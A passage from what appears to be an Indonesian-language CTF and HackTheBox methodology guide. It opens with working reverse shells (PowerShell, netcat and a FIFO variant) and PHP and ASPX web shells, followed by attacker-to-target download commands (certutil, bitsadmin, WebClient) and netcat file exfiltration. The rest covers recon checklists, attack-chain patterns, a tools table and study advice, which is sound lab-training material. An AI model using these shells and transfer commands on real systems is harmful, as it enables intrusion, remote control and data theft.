powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1 | Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length)};$client.Close()"
```

---

## 🐚 Netcat

```bash
# Netcat -e variant if target's nc supports it
nc "$LHOST" "$LPORT" -e /bin/bash
```

Fallback:

```bash
# FIFO-based reverse shell
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc "$LHOST" "$LPORT" > /tmp/f
```

---

# 5.3 📤 Web Shell Upload

## PHP

```php
<?php system($_GET['cmd']); ?>
```

Testing:

```bash
# Test command execution through a lab web shell
curl "http://$TARGET/shell.php?cmd=id"
```

## ASPX Template

```aspx
<%@ Page Language="C#" %>
<%
Response.Write(new System.Diagnostics.Process()
{
    StartInfo = new System.Diagnostics.ProcessStartInfo()
    {
        FileName = "cmd.exe",
        Arguments = "/c " + Request["cmd"],
        RedirectStandardOutput = true,
        UseShellExecute = false,
        CreateNoWindow = true
    }
}.Start());
%>
```

> Web shell hanya relevan ketika aplikasi memang mengizinkan file upload dan server mengeksekusi file tersebut. Upload berhasil ≠ code execution.

---

# 📦 BAGIAN 6 — FILE TRANSFER CHEATSHEET

## 6.1 ⬆️ Attacker → Target

### Python HTTP Server

```bash
# Host current directory on attacker
python3 -m http.server 8080
```

### Linux Target — wget

```bash
# Download file
wget "http://$LHOST:8080/file" -O file
```

### Linux Target — curl

```bash
# Download file
curl "http://$LHOST:8080/file" -o file
```

### Python urllib

```bash
# Download using Python
python3 -c "import urllib.request; urllib.request.urlretrieve('http://$LHOST:8080/file','file')"
```

---

## Windows Target

```powershell
# Download with curl
curl.exe http://$LHOST:8080/file -o file.exe
```

```powershell
# Invoke-WebRequest
iwr http://$LHOST:8080/file -OutFile file.exe
```

```powershell
# WebClient
(New-Object Net.WebClient).DownloadFile('http://$LHOST:8080/file','file.exe')
```

```powershell
# Certutil
certutil -urlcache -split -f http://$LHOST:8080/file file.exe
```

```powershell
# BITS
bitsadmin /transfer job http://$LHOST:8080/file C:\Users\Public\file.exe
```

---

## 6.2 ⬇️ Target → Attacker

### Netcat Pipe

Attacker:

```bash
# Listen for incoming file
nc -lvnp 9001 > received.file
```

Target:

```bash
# Send file
nc "$LHOST" 9001 < important.file
```

### Base64

Target:

```bash
# Encode binary/file as base64
base64 file > file.b64
```

Attacker:

```bash
# Decode copied base64 data
base64 -d file.b64 > file
```

### SCP

```bash
# Copy from target when SSH credentials and network path permit
scp USER@"$TARGET":/path/to/file .
```

---

## 6.3 🌐 Hosting File dari Parrot OS

```bash
# Start simple HTTP server
python3 -m http.server 8080
```

SMB:

```bash
# Host current folder as SMB share
impacket-smbserver share "$(pwd)" -smb2support
```

---

# 🧩 BAGIAN 7 — COMMON CTF PATTERNS

> Pattern berikut adalah **recognition aid**, bukan formula otomatis. HTB sendiri membedakan Easy, Medium, Hard, dan Insane berdasarkan kompleksitas exploitation chain; Easy umumnya memiliki jalur yang relatif jelas dan tidak membutuhkan binary exploitation/reverse engineering.

## 7.1 🟢 Pattern yang Sering Muncul di Easy Machines

### Pattern 1 — Web → Credential → SSH

```text
HTTP
↓
Source / backup / config
↓
Credentials
↓
SSH
↓
User
↓
PrivEsc
```

---

### Pattern 2 — FTP Anonymous

```text
21/tcp
↓
anonymous
↓
download file
↓
credential
↓
SSH/Web
```

---

### Pattern 3 — CMS Plugin/Extension

```text
WordPress/Joomla/Drupal
↓
Technology detection
↓
Version/plugin enumeration
↓
Known vulnerability
↓
Foothold
```

---

### Pattern 4 — SUID Binary

```text
Low privilege
↓
find / -perm -4000
↓
Interesting binary
↓
GTFOBins / manual analysis
↓
Privilege escalation
```

---

### Pattern 5 — Writable Cron Script

```text
Cron
↓
Script runs as root
↓
Current user can modify script
↓
Controlled command execution
↓
Root
```

---

### Pattern 6 — Sensitive Config

```text
Web app
↓
config.php / .env / backup
↓
DB credential
↓
Reuse
↓
Shell
```

---

### Pattern 7 — SMB File Leakage

```text
445
↓
Anonymous/guest
↓
Share
↓
Backup/config
↓
Credential
↓
WinRM/SSH/RDP
```

---

### Pattern 8 — Non-Standard Port

```text
-p-
↓
8888 / 8080 / 3000 / 5000 / 8000
↓
Custom application
↓
Web enumeration
↓
Foothold
```

Master recon juga menunjukkan mengapa port non-standard perlu dicari: contoh demonstrasinya menemukan service HTTP tambahan pada `8888/tcp` setelah full-port scan, lalu memprioritaskannya sebagai exposure unik.

---

### Pattern 9 — Credential Reuse

```text
Password ditemukan
↓
Validate
↓
SSH / SMB / Web / WinRM
↓
Authenticated foothold
```

---

### Pattern 10 — Backup / Git Exposure

```text
.git
.bak
.old
~
.zip
.tar.gz
config.old
```

↓

```text
Source code
↓
Hardcoded credential
↓
Secret
↓
Authentication
```

---

# 🟡 7.2 Pattern HackTheBox Medium

Pattern umum yang layak dikenali:

```text
1. Multiple service chain
2. Web foothold → local enumeration → privesc
3. Credential chain dengan lateral movement
4. Custom exploit/script sederhana
5. Chained vulnerabilities
```

Medium sering memerlukan:

```text
Enumeration
+
Reasoning
+
Adaptation
```

bukan hanya:

```text
run exploit
```

HTB menjelaskan Medium sebagai mesin yang dapat memerlukan custom exploitation tetapi tetap memiliki jalur keseluruhan yang relatif terstruktur.

---

# 🪟 7.3 Pattern Windows Machines

### Pattern 1

```text
SMB
↓
Shares
↓
Credential
↓
WinRM
```

### Pattern 2

```text
Web
↓
Credentials
↓
PowerShell
↓
Enumeration
↓
Privilege escalation
```

### Pattern 3

```text
Service
↓
Weak permissions
↓
Replace executable/config
↓
SYSTEM
```

### Pattern 4

```text
SeImpersonatePrivilege
↓
Token abuse
↓
SYSTEM
```

### Pattern 5

```text
AD
↓
User/group/ACL discovery
↓
Delegation / ACL / Kerberos / ADCS
↓
Privilege escalation
```

---

# 🧠 7.4 Kode / Artefak yang Sering Muncul

|Artefak|Kemungkinan Makna|
|---|---|
|Base64|Encoded data / credential|
|ROT13|Obfuscation ringan|
|`/etc/passwd`|User enumeration|
|`.env`|Application secrets|
|`.bak`|Backup|
|`.old`|Old config|
|`~`|Editor backup|
|`.git`|Source history|
|Git commit history|Removed secrets|
|Environment variable|Runtime secret|
|SSH private key|Authentication material|
|DB config|Database credentials|
|ZIP/TAR backup|Old application state|
|Debug page|Internal information|

---

# 🛠️ BAGIAN 8 — TOOLS QUICK REFERENCE

|Tool|Kategori|Command Paling Sering|Workflow|
|---|---|---|---|
|`nmap`|Recon|`nmap -sC -sV $TARGET`|Recon|
|`rustscan`|Recon|`rustscan -a $TARGET`|Recon|
|`masscan`|Fast scanner|`masscan`|Recon|
|`ping`|Reachability|`ping -c 4 $TARGET`|Recon|
|`curl`|HTTP|`curl -I URL`|Web|
|`wget`|Transfer|`wget URL`|File Transfer|
|`whatweb`|Fingerprinting|`whatweb URL`|Web|
|`ffuf`|Fuzzing|`ffuf -u URL/FUZZ`|Web|
|`gobuster`|Enumeration|`gobuster dir ...`|Web|
|`feroxbuster`|Enumeration|`feroxbuster -u URL`|Web|
|`nikto`|Web audit|`nikto -h URL`|Web|
|`wpscan`|WordPress|`wpscan --url URL`|CMS|
|`joomscan`|Joomla|`joomscan -u URL`|CMS|
|`droopescan`|CMS|`droopescan scan`|CMS|
|`sqlmap`|SQLi|`sqlmap -u URL`|Web|
|`Burp Suite`|Web proxy|Intercept request|Web|
|`smbclient`|SMB|`smbclient -L //$TARGET`|SMB|
|`enum4linux-ng`|SMB/AD|`enum4linux-ng $TARGET`|SMB|
|`rpcclient`|RPC|`rpcclient -U "" -N $TARGET`|SMB|
|`snmpwalk`|SNMP|`snmpwalk -v2c -c public $TARGET`|SNMP|
|`ldapsearch`|LDAP|`ldapsearch -x -H ldap://$TARGET`|LDAP|
|`dig`|DNS|`dig $TARGET`|DNS|
|`ftp`|FTP|`ftp $TARGET`|FTP|
|`ssh`|Remote shell|`ssh USER@$TARGET`|SSH|
|`mysql`|DB|`mysql -h $TARGET -u USER -p`|DB|
|`impacket`|Windows/AD|`impacket-*`|AD/Windows|
|`evil-winrm`|WinRM|`evil-winrm -i $TARGET`|Windows|
|`xfreerdp`|RDP|`xfreerdp /v:$TARGET`|Windows|
|`netcat`|Network|`nc -lvnp $LPORT`|Shell|
|`rlwrap`|Shell helper|`rlwrap nc ...`|Shell|
|`LinPEAS`|Linux PE|`./linpeas.sh`|PrivEsc|
|`WinPEAS`|Windows PE|`.\winPEASx64.exe`|PrivEsc|
|`BloodHound`|AD analysis|`bloodhound-python ...`|AD|
|`john`|Cracking|`john hash.txt`|Credentials|
|`hashcat`|Cracking|`hashcat ...`|Credentials|
|`strings`|Binary|`strings file`|Binary|
|`file`|File type|`file file`|Forensics|
|`xxd`|Hex|`xxd file`|Forensics|
|`base64`|Encoding|`base64 -d file`|Crypto|
|`git`|Source analysis|`git log`|Web|
|`jq`|JSON|`jq '.' file.json`|Data|
|`grep`|Search|`grep -R`|General|
|`find`|Search|`find / ...`|General|
|`ps`|Process|`ps aux`|Post-exploit|
|`ss`|Network|`ss -tulpn`|Post-exploit|
|`sudo`|PrivEsc|`sudo -l`|PrivEsc|
|`getcap`|Capabilities|`getcap -r /`|PrivEsc|
|`tmux`|Workspace|`tmux new -s ctf`|Operations|

---

# 🛑 BAGIAN 9 — CHECKLIST STUCK?

> **Ini adalah section terpenting untuk pemula.**

## 9.1 🔍 Stuck di Recon?

```text
□ Sudah cek apakah target reachable?
□ Sudah melakukan fast scan?
□ Sudah menjalankan full TCP scan?
□ Sudah cek semua 65.535 port?
□ Sudah cek top UDP?
□ Sudah scan service/version?
□ Sudah reconnect langsung ke setiap interesting port?
□ Sudah cek non-standard ports?
□ Sudah cek hostname/FQDN?
□ Sudah catat semua service?
□ Sudah melakukan service prioritization?
```

Jika masih stuck:

```text
JANGAN:
→ langsung exploit random

LAKUKAN:
→ review seluruh port
→ cari service yang belum disentuh
→ cari port non-standard
→ rerun targeted enumeration
```

---

# 🌐 9.2 Stuck di Web?

```text
□ Sudah baca source?
□ Sudah cek HTTP headers?
□ Sudah cek cookies?
□ Sudah cek JavaScript?
□ Sudah cek robots.txt?
□ Sudah cek sitemap.xml?
□ Sudah directory enumeration?
□ Sudah extension fuzzing?
□ Sudah vhost enumeration?
□ Sudah cek parameters?
□ Sudah cek HTTP methods?
□ Sudah cari login?
□ Sudah cari upload?
□ Sudah cari API?
□ Sudah cek backup files?
□ Sudah fingerprint technology?
□ Sudah cek CMS?
□ Sudah baca error messages?
```

### Kalau directory fuzzing tidak menghasilkan apa-apa

Jangan otomatis:

```text
"wordlist saya kurang besar"
```

Pertimbangkan:

```text
VHost
JS
API
parameters
HTTP methods
subdomains
technology-specific endpoints
authentication surface
```

---

# 🎯 9.3 Stuck di Foothold?

```text
□ Semua service sudah dienumerasi?
□ Credential sudah dicatat?
□ Credential reuse sudah diuji secara terarah?
□ Default credential candidate sudah diperiksa?
□ Version sudah diverifikasi?
□ CVE yang relevan sudah diteliti?
□ PoC sudah dibaca, bukan sekadar dijalankan?
□ Upload behavior sudah dipahami?
□ LFI/RFI sudah dianalisis?
□ SQLi sudah diuji manual?
□ Authentication flow sudah dipahami?
□ API sudah diperiksa?
□ File backup sudah dicari?
□ Source/Git history sudah dicari?
```

### Pertanyaan Pemecah Kebuntuan

```text
Apa satu fakta penting yang belum saya ketahui?
```

Bukan:

```text
Exploit apa lagi yang belum saya coba?
```

---

# 🔥 9.4 Stuck di PrivEsc?

```text
□ whoami
□ id / groups
□ sudo -l
□ SUID
□ SGID
□ capabilities
□ cron
□ services
□ writable files
□ writable directories
□ processes
□ environment variables
□ credentials
□ shell history
□ SSH keys
□ /opt
□ /var/www
□ Docker/LXC
□ NFS
□ kernel version
□ LinPEAS/WinPEAS
□ follow-up setiap finding automation
```

### GTFOBins Workflow

```text
Interesting binary
↓
Does current user control it?
↓
Can it execute/read/write?
↓
Search GTFOBins
↓
Understand exploit
↓
Reproduce manually
↓
Confirm privilege transition
```

---

# 🧭 BAGIAN 10 — KAPAN BACA WRITEUP?

## 10.1 ⏳ Berapa Lama Coba Sendiri?

Tidak ada angka universal.

Gunakan aturan:

```text
Coba sendiri
↓
Enumeration lengkap?
↓
Hipotesis konkret?
↓
Testable?
↓
Sudah time-boxed?
```

Untuk mesin Easy, sering kali:

```text
30–60 menit focused work
```

sudah cukup untuk memutuskan apakah kamu benar-benar stuck.

Untuk Medium:

```text
60–120+ menit
```

dapat masuk akal, terutama jika konsep baru.

Yang penting bukan:

> “Berapa lama saya menahan diri?”

Tetapi:

> **“Apakah saya masih menghasilkan informasi baru?”**

---

## 10.2 📖 Cara Baca Writeup dengan Benar

JANGAN:

```text
buka writeup
↓
copy exploit
↓
paste
↓
flag
↓
selesai
```

Gunakan:

```text
STUCK
↓
Open writeup
↓
Read ONLY next clue
↓
Close
↓
Reproduce yourself
↓
Explain WHY
↓
Continue
```

### Teknik Spoiler Control

Contoh:

```text
Level 1:
"Port mana yang harus diperiksa?"

Level 2:
"Service apa yang penting?"

Level 3:
"Apa vulnerability-nya?"

Level 4:
"Bagaimana exploit-nya?"
```

Ambil level seminimal mungkin yang diperlukan untuk bergerak.

---

## 10.3 🧠 Cara Belajar Maksimal dari Writeup

Setelah selesai:

```text
1. Tutup writeup.
2. Kerjakan ulang tanpa melihat.
3. Tulis seluruh chain dari ingatan.
4. Jelaskan WHY tiap langkah.
5. Tandai apa yang terlewat.
6. Ulangi challenge beberapa hari kemudian.
```

### Post-Challenge Review

```text
Machine:
Difficulty:

What did I miss?

What clue should I have recognized?

Where did enumeration fail?

Where did reasoning fail?

Where did tool knowledge fail?

What command should become muscle memory?

What concept must be studied?

What pattern should I remember?
```

---

# 🔗 BAGIAN 11 — CROSS-REFERENCE INDEX

> **Tujuan index:** ketika kamu stuck, gunakan kondisi yang sedang kamu hadapi untuk memilih workflow spesifik.
> 
> Jangan mencari file berdasarkan nomor secara membabi buta. Cari berdasarkan **problem state**.

## 🏛️ Fondasi — File 01–04

|File|Workflow|Kapan digunakan|
|---|---|---|
|File 01|**Universal Network Recon**|Saat baru menerima IP/host target|
|File 02|**Foundation / Host & Service Methodology**|Saat perlu membangun baseline enumeration|
|File 03|**Fondasi yang terkait enumeration**|Saat belum yakin bagaimana memilih langkah berikutnya|
|File 04|**Fondasi methodology berikutnya**|Saat perlu kembali ke decision-making framework|

> **Catatan:** nama file literal File 02–04 perlu disesuaikan dengan repository final series agar index tidak mengarang nama.

---

## 🌐 Network Services — File 05–14

```text
File 05 → Network service workflow
File 06 → FTP
File 07 → SSH
File 08 → SMTP
File 09 → DNS
File 10 → HTTP / HTTPS
File 11 → SMB
File 12 → SNMP
File 13 → LDAP
File 14 → Database / Remote Services
```

### Rule

```text
Port 21
→ buka workflow FTP

Port 22
→ buka workflow SSH

Port 80/443
→ buka workflow Web

Port 139/445
→ buka workflow SMB

Port 161
→ buka workflow SNMP

Port 389
→ buka workflow LDAP
```

---

# 🌐 Web Exploitation — File 15–34

|File Range|Kapan dibuka|
|---|---|
|15–18|Web reconnaissance & discovery|
|19–22|Authentication / authorization issues|
|23|SSTI|
|24|LFI/RFI|
|25|SSRF / server-side attacks yang relevan|
|26|File upload|
|27|Access Control / IDOR|
|28|JWT|
|29–30|API / authentication attack surface|
|31–34|Advanced web exploitation / chaining|

Dari series yang sudah dibangun, File 23 memang merupakan workflow SSTI dan File 24 merupakan workflow LFI/RFI; struktur tersebut sesuai dengan dependency yang kamu gunakan pada series sebelumnya.

---

# 🏢 Active Directory — File 35–43

## File 35

```text
Kapan digunakan:
→ setelah memperoleh domain/AD context
→ users
→ groups
→ computers
→ SPNs
→ credentials
→ BloodHound data
```

## File 36

```text
Kapan digunakan:
→ setelah initial AD enumeration
→ membutuhkan workflow lanjutan dalam domain
```

## File 37 — Kerberoasting / AS-REP Roasting

```text
Kapan digunakan:
→ ketika menemukan domain account/SPN
→ ketika authentication context sudah diketahui
```

File ini tersedia di library sebagai `[🔥 Workflow 37 — Kerberoasting & AS-REP Roasting](/docs/kerberoasting-asreproasting)`.

## File 38 — AD ACL Abuse

```text
Kapan digunakan:
→ BloodHound menunjukkan relationship/ACL menarik
→ GenericAll
→ GenericWrite
→ WriteDACL
→ WriteOwner
→ AddMember
```

File ini tersedia sebagai `[🔐 File 38 — Active Directory ACL Abuse Workflow](/docs/ad-acl-abuse)`.

## File 39–43

```text
Kapan digunakan:
→ workflow Active Directory lanjutan
→ delegation
→ ADCS
→ lateral movement
→ privilege escalation
→ domain compromise path
```

> Sesuaikan nama literal File 39–43 dengan file final repository.

---

# 🐧 Privilege Escalation — File 44–47

```text
File 44
→ Linux Privilege Escalation

File 45
→ Windows Privilege Escalation

File 46
→ Advanced PrivEsc / Service / Credential abuse

File 47
→ Final privilege escalation chaining
```

### Trigger

```text
LOW PRIV SHELL
↓
Buka File 44–47
```

---

# ⚙️ Binary & Reversing — File 48–52

```text
File 48
→ Binary Analysis

File 49
→ Buffer Overflow

File 50
→ Linux PrivEsc / binary-related post exploitation

File 51
→ Advanced binary/reversing workflow

File 52
→ Binary / reversing / pattern analysis continuation
```

File 49 pada series sebelumnya memang digunakan untuk Buffer Overflow dasar, dan File 52 digunakan untuk pola binary/CTF menurut struktur series yang telah kamu bangun.

---

# 🔐 Crypto & Forensics — File 53–58

```text
File 53
→ Cryptography basics/patterns

File 54
→ Encoding / crypto workflow

File 55
→ General forensics / PCAP basics

File 56
→ File / artifact forensics

File 57
→ Hash cracking workflow

File 58
→ Advanced crypto/forensics continuation
```

### Trigger

```text
Strange encoded text
→ Crypto workflow

PCAP
→ Forensics / PCAP workflow

Hash
→ Hash identification + cracking workflow

Suspicious file
→ File forensics workflow
```

---

# ☁️ Cloud & Mobile — File 59–61

```text
File 59
→ Cloud security workflow

File 60
→ Mobile security workflow

File 61
→ Cloud/Mobile advanced workflow
```

### Trigger

```text
AWS / Azure / GCP artifact
→ File 59

APK / Android
→ File 60

Cloud/mobile advanced issue
→ File 61
```

---

# 🕵️ OSINT & Misc — File 62–65

```text
File 62
→ OSINT workflow

File 63
→ Miscellaneous security workflow

File 64
→ Supporting / specialized workflow

File 65
→ GENERAL CTF METHODOLOGY
```

**File 65 adalah GPS utama.**

Saat tidak tahu file mana yang harus dibuka:

```text
CURRENT PROBLEM
      ↓
FILE 65
      ↓
IDENTIFY DOMAIN
      ↓
IDENTIFY TRIGGER
      ↓
OPEN SPECIFIC WORKFLOW
```

---

# 🗺️ MASTER “WHICH FILE DO I OPEN?” DECISION TREE

```text
             STUCK
               │
               ▼
      ┌─────────────────┐
      │ Masih punya IP? │
      └───────┬─────────┘
              │
             YES
              │
              ▼
        File 01 / Recon
              │
              ▼
     ┌──────────────────┐
     │ Sudah punya port?│
     └────────┬─────────┘
              │
             YES
              │
      ┌───────┼───────────────┐
      │       │               │
      ▼       ▼               ▼
    WEB     SMB/AD          OTHER
      │       │               │
      ▼       ▼               ▼
 Web Files  AD Files      Service File
      │       │               │
      ▼       ▼               ▼
  Foothold  Foothold       Foothold
      │       │               │
      └───────┼───────────────┘
              │
              ▼
         HAVE SHELL?
              │
             YES
              │
              ▼
      File 44–47 / PE
              │
              ▼
        ROOT / SYSTEM
```

---

# 🔁 MASTER REASSESSMENT LOOP

Jangan berpikir CTF adalah linear:

```text
RECON
 ↓
EXPLOIT
 ↓
ROOT
```

Gunakan model:

```text
             ┌───────────────┐
             │   ENUMERATE   │
             └───────┬───────┘
                     │
                     ▼
             ┌───────────────┐
             │   HYPOTHESIS  │
             └───────┬───────┘
                     │
                     ▼
             ┌───────────────┐
             │      TEST     │
             └───────┬───────┘
                     │
              ┌──────┴──────┐
              │             │
           SUCCESS         FAIL
              │             │
              ▼             ▼
           EXPAND        REASSESS
              │             │
              │             ▼
              │        NEW HYPOTHESIS
              │             │
              └──────┬──────┘
                     │
                     ▼
                NEXT ACTION
```

---

# 🧠 MASTER EVIDENCE TRACKER

Gunakan format:

```text
OBSERVED:
Port 445 open.

INFERRED:
SMB likely available.

HYPOTHESIS:
Anonymous SMB may expose a share.

SUPPORTED:
smbclient -L -N lists shares.

CONFIRMED:
Successfully accessed SHARE with anonymous session.
```

**Jangan menggabungkan fakta dengan asumsi.**

Contoh buruk:

```text
445 = vulnerable SMB.
```

Contoh baik:

```text
445/tcp open
SMB service detected
Anonymous share enumeration tested
SHARENAME confirmed accessible
```

---

# 🧪 MASTER “WHY BEFORE COMMAND”

Sebelum setiap command besar:

```text
KNOWN:
Apa yang sudah diketahui?

UNKNOWN:
Apa yang belum diketahui?

QUESTION:
Apa pertanyaan yang ingin dijawab?

WHY:
Mengapa command ini relevan?

EXPECTED:
Output apa yang saya harapkan?

OBSERVED:
Apa yang benar-benar muncul?

DECISION:
Apa langkah berikutnya?
```

Contoh:

```text
KNOWN:
Port 445 terbuka.

UNKNOWN:
Apakah SMB anonymous access tersedia?

QUESTION:
Apakah share dapat dilisting tanpa credential?

WHY:
Anonymous SMB dapat memberikan information disclosure.

COMMAND:
smbclient -L //$TARGET -N

EXPECTED:
Daftar share atau access denied.

OBSERVED:
Share "backup" terlihat.

DECISION:
Enumerate backup share.
```

---

# 🚨 ANTI-RANDOM-HACKING RULES

## Rule 1

```text
Jangan:
run 20 exploit tanpa tahu kenapa.

Lakukan:
satu hypothesis → satu test → satu decision.
```

## Rule 2

```text
Jangan:
anggap version = vulnerability.

Lakukan:
version → verify conditions → test.
```

## Rule 3

```text
Jangan:
credential spray random.

Lakukan:
credential source → service relevance → validation.
```

## Rule 4

```text
Jangan:
terlalu lama di satu rabbit hole.

Lakukan:
time-box → reassess → pivot.
```

## Rule 5

```text
Jangan:
mengejar exploit sebelum attack surface lengkap.

Lakukan:
enumerate → prioritize → exploit.
```

---

# ⚡ MUSCLE MEMORY — 60 SECOND START

Ketika baru melihat machine:

```bash
# 1. Set target
export TARGET="10.10.11.X"

# 2. Check reachability
ping -c 4 "$TARGET"

# 3. Fast scan
nmap -sC -sV "$TARGET" -oN nmap/quick.txt

# 4. Full TCP background
nmap -p- "$TARGET" -oN nmap/allports.txt > nmap/allports.log 2>&1 &

# 5. UDP top 20
sudo nmap -sU --top-ports 20 "$TARGET" -oN nmap/udp.txt
```

Lalu:

```text
READ PORTS
     ↓
PRIORITIZE SERVICES
     ↓
OPEN CORRESPONDING WORKFLOW
     ↓
ENUMERATE
```

---

# ⚡ MUSCLE MEMORY — SAAT DAPAT SHELL

```bash
# Identity
whoami
id

# Location
pwd
hostname

# OS
uname -a
cat /etc/os-release

# Network
ip addr
ip route

# Privileges
sudo -l

# SUID
find / -perm -4000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Cron
crontab -l 2>/dev/null

# Processes
ps aux

# Listening services
ss -tulpn

# Interesting homes
ls -la /home
ls -la /opt
ls -la /var/www
```

---

# ⚡ MUSCLE MEMORY — SAAT STUCK

Ucapkan:

```text
STOP.

Apa yang saya tahu?

Apa yang belum saya tahu?

Apa service yang belum saya sentuh?

Apa satu test murah yang belum saya lakukan?

Apakah saya sedang mengejar hypothesis
atau mengejar harapan?
```

Lalu:

```text
REASSESS
```

---

# 🏆 POST-CHALLENGE REVIEW

Setelah mendapat flag, jangan langsung menutup mesin.

Tulis:

```markdown
# POST-CHALLENGE REVIEW

## Intended Path

Recon
→ Enumeration
→ Foothold
→ Stabilization
→ PrivEsc
→ Root

## What I Found

-

## What I Missed

-

## Where I Lost Time

-

## Rabbit Holes

-

## Key Clues

-

## Commands That Became Muscle Memory

-

## Concept I Need to Study

-

## Pattern Recognition

-

## What I Would Do Differently

-
```

---

# 🧭 FINAL CTF OPERATING LOOP

```text
┌────────────────────────────────────────────────────┐
│                    TARGET                          │
└────────────────────────┬───────────────────────────┘
                         ▼
┌────────────────────────────────────────────────────┐
│                 REACHABILITY                       │
└────────────────────────┬───────────────────────────┘
                         ▼
┌────────────────────────────────────────────────────┐
│                 PORT DISCOVERY                     │
└────────────────────────┬───────────────────────────┘
                         ▼
┌────────────────────────────────────────────────────┐
│               SERVICE ENUMERATION                  │
└────────────────────────┬───────────────────────────┘
                         ▼
┌────────────────────────────────────────────────────┐
│              TECHNOLOGY DISCOVERY                  │
└────────────────────────┬───────────────────────────┘
                         ▼
┌────────────────────────────────────────────────────┐
│                ATTACK SURFACE                      │
└────────────────────────┬───────────────────────────┘
                         ▼
┌────────────────────────────────────────────────────┐
│                HYPOTHESIS                          │
└────────────────────────┬───────────────────────────┘
                         ▼
┌────────────────────────────────────────────────────┐
│                    TEST                            │
└────────────────────────┬───────────────────────────┘
                         ▼
                ┌────────┴────────┐
                │                 │
             SUCCESS            FAIL
                │                 │
                ▼                 ▼
             FOOTHOLD         REASSESS
                │                 │
                ▼                 ▼
             STABLE SHELL    NEW HYPOTHESIS
                │                 │
                ▼                 │
          POST EXPLOITATION ◄─────┘
                │
                ▼
          PRIVILEGE ESCALATION
                │
                ▼
          USER / ROOT / SYSTEM
                │
                ▼
             FLAG
                │
                ▼
         POST-CHALLENGE REVIEW
```

---

# ❤️ PESAN PENUTUP

Selamat.

Kalau kamu sudah sampai File 65, tujuanmu seharusnya bukan lagi:

> “Saya hafal banyak command.”

Tujuan sebenarnya adalah:

> **“Saya tahu apa yang harus saya tanyakan kepada target berikutnya.”**

Kamu tidak perlu menghafal seluruh internet.

Kamu perlu membangun refleks:

```text
SEE
 ↓
ASK
 ↓
ENUMERATE
 ↓
UNDERSTAND
 ↓
TEST
 ↓
CONFIRM
 ↓
PIVOT
 ↓
EXPLOIT
 ↓
LEARN
```

Ketika melihat:

```text
22/tcp
```

pikiranmu harus otomatis menuju:

```text
SSH enumeration
```

Ketika melihat:

```text
80/tcp
```

pikiranmu menuju:

```text
HTTP → technology → content → routes → parameters → auth → vulnerabilities
```

Ketika mendapatkan:

```text
low privilege shell
```

pikiranmu menuju:

```text
identity → privileges → files → processes → services → credentials → privesc
```

Dan ketika kamu stuck:

```text
JANGAN PANIK.
JANGAN RANDOM.
JANGAN MENYAMAKAN HARAPAN DENGAN EVIDENCE.

STOP.
ENUMERATE.
THINK.
TEST.
REASSESS.
```

CTF bukan tentang siapa yang paling cepat mengetik command.

CTF adalah latihan menjadi orang yang mampu mengubah:

```text
UNKNOWN
```

menjadi:

```text
KNOWN
```

sedikit demi sedikit.

Dan itulah skill yang sebenarnya dibawa keluar dari lab.

---

# 🏁 END OF FILE 65

```text
65 FILES
   ↓
ONE METHODOLOGY
   ↓
ONE DECISION PROCESS
   ↓
ONE OPERATING LOOP

ENUMERATE
    ↓
UNDERSTAND
    ↓
EXPLOIT
    ↓
ESCALATE
    ↓
LEARN
```

**End of CTF General Methodology.**